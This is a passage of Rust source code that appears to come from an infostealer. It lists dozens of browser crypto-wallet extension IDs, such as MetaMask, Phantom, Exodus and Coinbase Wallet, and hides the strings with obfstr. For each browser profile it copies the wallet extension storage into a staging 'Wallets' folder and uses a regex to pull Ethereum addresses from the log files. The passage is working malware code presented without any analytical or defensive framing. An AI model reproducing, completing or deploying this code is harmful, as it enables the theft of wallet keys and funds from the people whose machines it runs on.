        extensions.insert(obfstr::obfstr!("Nifty Wallet").to_string(),            obfstr::obfstr!("jbdaocneiiinmjbjlgalhcelgbejmnid").to_string());
        extensions.insert(obfstr::obfstr!("Liquality Wallet").to_string(),        obfstr::obfstr!("kpfopkelmapcoipemfendmdcghnegimn").to_string());
        extensions.insert(obfstr::obfstr!("Math Wallet").to_string(),             obfstr::obfstr!("afbcbjpbpfadlkmhmclhkeeodmamcflc").to_string());
        extensions.insert(obfstr::obfstr!("Coinbase Wallet").to_string(),         obfstr::obfstr!("hnfanknocfeofbddgcijnmhnfnkdnaad").to_string());
        extensions.insert(obfstr::obfstr!("Clover Wallet").to_string(),           obfstr::obfstr!("nhnkbkgjikgcigadomkphalanndcapjk").to_string());
        extensions.insert(obfstr::obfstr!("Yoroi").to_string(),                   obfstr::obfstr!("ffnbelfdoeiohenkjibnmadjiehjhajb").to_string());
        extensions.insert(obfstr::obfstr!("Guarda").to_string(),                  obfstr::obfstr!("hpglfhgfnhbgpjdenjgmdgoeiappafln").to_string());
        extensions.insert(obfstr::obfstr!("EQUAL Wallet").to_string(),            obfstr::obfstr!("blnieiiffboillknjnepogjhkgnoapac").to_string());
        extensions.insert(obfstr::obfstr!("BitApp Wallet").to_string(),           obfstr::obfstr!("fihkakfobkmkjojpchpfgcmhfjnmnfpi").to_string());
        extensions.insert(obfstr::obfstr!("Auro Wallet").to_string(),             obfstr::obfstr!("cnmamaachppnkjgnildpdmkaakejnhae").to_string());
        extensions.insert(obfstr::obfstr!("Saturn Wallet").to_string(),           obfstr::obfstr!("nkddgncdjgjfcddamfgcmfnlhccnimig").to_string());
        extensions.insert(obfstr::obfstr!("Ronin Wallet").to_string(),            obfstr::obfstr!("fnjhmkhhmkbjkkabndcnnogagogbneec").to_string());
        extensions.insert(obfstr::obfstr!("Exodus").to_string(),                  obfstr::obfstr!("aholpfdialjgjfhomihkjbmgjidlcdno").to_string());
        extensions.insert(obfstr::obfstr!("Maiar DeFi Wallet").to_string(),       obfstr::obfstr!("dngmlblcodfobpdpecaadgfbcggfjfnm").to_string());
        extensions.insert(obfstr::obfstr!("Nami").to_string(),                    obfstr::obfstr!("lpfcbjknijpeeillifnkikgncikgfhdo").to_string());
        extensions.insert(obfstr::obfstr!("Eternl").to_string(),                  obfstr::obfstr!("kmhcihpebfmpgmihbkipmjlmmioameka").to_string());
        extensions.insert(obfstr::obfstr!("Phantom Wallet").to_string(),          obfstr::obfstr!("bfnaelmomeimhlpmgjnjophhpkkoljpa").to_string());
        extensions.insert(obfstr::obfstr!("Metamask_edge").to_string(),           obfstr::obfstr!("ejbalbakoplchlghecdalmeeeajnimhm").to_string());

     unsafe {
             //let path = get_app_dir(AppDataType::UserCache, &dumper.app_info, obfstr::obfstr!("User Data/Default/Local Extension Settings/")).unwrap();
            let mut i = 0;
             for profile in PROFILES.clone() {
             let path = std::path::Path::new(&profile);
             if path.exists() {
                 for(extension_name, extension_path) in &extensions {
                     let extension_path_str = format!("{}{}{}\\", profile, obfstr::obfstr!("\\Local Extension Settings\\"), extension_path);
                     let extension_path = std::path::Path::new(&extension_path_str);
                     if extension_path.exists() {

                         crate::WALLETS += 1;
     
                         let _ = std::fs::create_dir_all(format!("{}{}{}_[{}]_{}_{i}\\", path_output.clone(), obfstr::obfstr!("\\Wallets\\"), &self.app_info.author, &self.app_info.name, extension_name));
                         let walker = walkdir::WalkDir::new(extension_path_str).into_iter();
     
                         for entry in walker {
                             let entry = entry.unwrap();
    
            if entry.path().file_name().unwrap().to_str().unwrap().contains(".log") {

                let file_content = std::fs::read(entry.path()).unwrap();
                let lossy = String::from_utf8_lossy(&file_content);

                let captures = regex::Regex::new(r#"\{"0x[a-zA-Z0-9]{40}""#).unwrap().captures(&lossy);

                if captures.is_none() {
                    continue;
                }
               let address = captures.unwrap().iter().map(|f| f.unwrap().as_str().to_string()).collect::<Vec<String>>();

                        println!("{:?}", address);
                        for info in address {
                            let replaced = info.replace("\"", "");
                            let replaced = replaced.replace("{", "");
                            crate::additional_infos.push(format!("{}{}", obfstr::obfstr!("MetaMask Address: "), replaced));
                        }
            }
                             let _ = std::fs::copy(
                                 entry.path(),
                                 format!("{}{}{}_[{}]_{}_{i}\\{}", 
                                     path_output.clone(), 
                                     obfstr::obfstr!("\\Wallets\\"),
                                     &self.app_info.author, &self.app_info.name,
                                     extension_name,
                                     entry.path().file_name().unwrap().to_str().unwrap()
                                 ),
                             );

                             
                         }
                     }
                 }
                 i+=1;
     
             }
        }
        Ok(())
    }
}
}